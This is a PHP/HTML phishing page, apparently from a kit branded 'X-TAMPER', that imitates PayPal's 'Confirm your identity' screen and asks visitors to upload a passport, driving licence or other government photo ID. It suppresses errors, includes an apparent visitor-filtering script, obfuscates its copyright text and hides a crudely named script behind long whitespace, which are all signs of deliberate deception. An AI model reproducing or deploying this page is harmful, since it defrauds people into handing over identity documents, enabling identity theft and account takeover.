<?php

/**
                                                                             
                                                                             
                                                                             
$$\   $$\     $$$$$$$$\  $$$$$$\  $$\      $$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\  
$$ |  $$ |    \__$$  __|$$  __$$\ $$$\    $$$ |$$  __$$\ $$  _____|$$  __$$\ 
\$$\ $$  |       $$ |   $$ /  $$ |$$$$\  $$$$ |$$ |  $$ |$$ |      $$ |  $$ |
 \$$$$  /$$$$$$\ $$ |   $$$$$$$$ |$$\$$\$$ $$ |$$$$$$$  |$$$$$\    $$$$$$$  |
 $$  $$< \______|$$ |   $$  __$$ |$$ \$$$  $$ |$$  ____/ $$  __|   $$  __$$< 
$$  /\$$\        $$ |   $$ |  $$ |$$ |\$  /$$ |$$ |      $$ |      $$ |  $$ |
$$ /  $$ |       $$ |   $$ |  $$ |$$ | \_/ $$ |$$ |      $$$$$$$$\ $$ |  $$ |
\__|  \__|       \__|   \__|  \__|\__|     \__|\__|      \________|\__|  \__|
                                                                             
                                                                             
                                                                             
**/

error_reporting(0);
@session_start(); 
include("../not.php");
?>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta name="application-name" content="PayPal">
  <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
  <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
  <meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=http://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
  <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
  <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
  <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico"><link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><!-- metadata regarding locale that is used by client-side scripts -->
  <meta name="country" content="GB">
  <meta name="language" content="en">
  <title>Confirm your identity</title>
  <link rel="stylesheet" type="text/css" href="css/app.css">
  <!--[if IE 8]><link rel="stylesheet" type="text/css" href="css/internetExplorer.css" /><![endif]-->
  <style type="text/css"></style>
  <script src="js/jquery.js"></script>
  </head>
  <body>
    <div class="grey-background header-body">
      <div id="header">
        <div class="container-fluid center-block-big">
          <table><tbody><tr><td><a href="#"><img src="img/logo_paypal_106x29.png" width="106" height="29" alt="PayPal"></a></td><td align="right" width="100%"></td></tr></tbody></table>
        </div></div>
      <div id="wrapper" class="page-container" role="main">
        <div id="verify-identity">
          <div class="container-fluid trayNavOuter verify-tray">
            <div class="trayNavInner requirejs-wait" data-overlay-background="rgba(255,255,255,.7)">
<div class="row">
<div class="col-md-12">
<form method="POST" id="form5" data-auto-disable="false" enctype="multipart/form-data">


<div class="verify-option" id="upload-option" style="display: block;">
<label class="no-bottom-margin">Which type of document will you upload?</label><div>
<p class="toggle-requirements"><a href="#" id="js-toggle-requirements" class="collapsed">
<span id="js-label-hide-requirements" class="hide">Hide file requirements</span>
<span id="js-label-show-requirements" class="">Show file requirements</span></a></p>
<ul id="js-file-upload-requirements" class="file-upload-requirements hide">
<li>Files should be smaller than 5MB.</li>
<li>Please use one of these file types: JPG, GIF, PNG or PDF.</li>
<li>Upload files that display up-to-date and legible details.</li>
</ul></div>
<div class="form-group"><div class="nativeDropdown long lap enhanced">
<label for="uploadOption">Select any one</label>
<div class="selectDropdown"><select id="uploadOption" name="uploadOption" class="validate">
<option value="-1" selected>Select any one</option>
<option value="0">Passport</option>
<option value="1">Driving Licence</option>
<option value="2">Any other Government-issued photo ID</option></select>
<input type="hidden" name="doctype" id="doctype" value="">
<div class="custom-select" aria-hidden="true"></div>
</div></div>

</div>
<div id="error-list">
<p id="FE_DU_010" class="error-msg" style="display: none;">File should be between 1KB to 5MB in size.</p>
<p id="FE_DU_020" class="error-msg" style="display: none;">File should be between 1KB to 5MB in size.</p>
<p id="FE_DU_030" class="error-msg" style="display: none;">Please upload a JPG, GIF, PNG or PDF file.</p>
<p id="FE_DU_040" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p>
<p id="FE_DU_050" class="error-msg" style="display: none;">The total for all the files you upload must be smaller than 10MB. Please decrease your file size and try again.</p>
<p id="NE_DU_005" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p>
<p id="NE_DU_010" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p>
<p id="NE_DU_020" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p>
<p id="SE_DU_010" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p>
<p id="SE_DU_020" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p>
<p id="SE_DU_030" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p>
<p id="SE_DU_040" class="error-msg" style="display: none;">We're sorry, but we're having trouble uploading your file. Please try again.</p></div>
<div class="classic-experience" style="display: none;">
<input id="desktopUploadControl" name="desktopUploadControl" type="file" accept="image/jpeg,image/pjpeg,image/png,image/gif,application/pdf"></div>
<div id="upload-area" class="row soft-hide" style="display: none;">
<div class="col-sm-6"><div id="desktopUploadArea" class="box drag-and-drop">
<label for="desktopUploadControl" id="desktopUploadButton" class="upload-button">
<span class="full-experience">Drag and Drop, or Upload File</span>
<span class="classic-experience" style="display: none;">Upload File</span></label>
</div></div></div>
<div class="row"><div class="col-md-6 preview-area-wrap"><div id="preview-area" class="preview-area desktop row soft-hide"style="display: none;">
<div class="col-md-12 box"><div id="uploadSpinner" class="uploadSpinner"style="display: none;">Loading...</div>
<div id="filePreview1" class="filePreview soft-hide drag-and-drop" style="display: none;">
<div id="fileInfo1" class="fileInfo" ></div>
<div id="magPrev" ></div>
 
<div id="filePreviewOverlay1" class="filePreviewOverlay soft-hide"style="display: none;" >
<p><a href="#" id="removeFile" class="remove-file" style="color:#fff;">Remove</a></p>
</div></div></div></div></div></div>
<div class="buttons">
<input name="uploadSubmit" id="uploadSubmit" class="btn btn-primary" type="submit" value="Continue" disabled="">
</div></div>
</form>
</div></div></div>
				  </div></div>
				  </div></div>
    <script src="js/require_spn.js"></script>
	
    <footer class="footer"><div class="footer-nav">
	<div class="site-links container-fluid" style="align: right">
	<ul class="navlist">
	<li>
	<a href="#">Contact</a></li>
	<li><a href="#">Security</a></li>
	<li><a href="#">Log Out</a></li></ul></div></div>
	<div class="footer-legal"><div class="container-fluid">
	<span class="copyright">Cop&#121;&#114;&#105;&#103;&#104;&#116;&#32;&#169;&#32;&#49;&#57;&#57;&#57;&#45;&#50;&#48;&#49;&#55;&#32;&#80;&#97;&#121;&#80;&#97;&#108;&#46;&#32;&#65;&#108;&#108;&#32;&#114;&#105;&#103;&#104;&#116;&#115;&#32;&#114;&#101;&#115;&#101;rved.</span>
	<span class="short-copyright">© 1999-2017</span>
	<ul class="navlist footer-list"><li><a href="#" target="_blank">Privacy</a></li>
	<li><a href="#" target="_blank">Legal</a></li></ul></div></div></div></footer></div>
	<script src="js/fuck_vs.js"></script>																																																																																																																																																	
           </body></html>
		   